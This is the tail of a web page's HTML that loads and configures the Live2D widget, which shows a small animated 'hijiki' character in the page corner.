<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
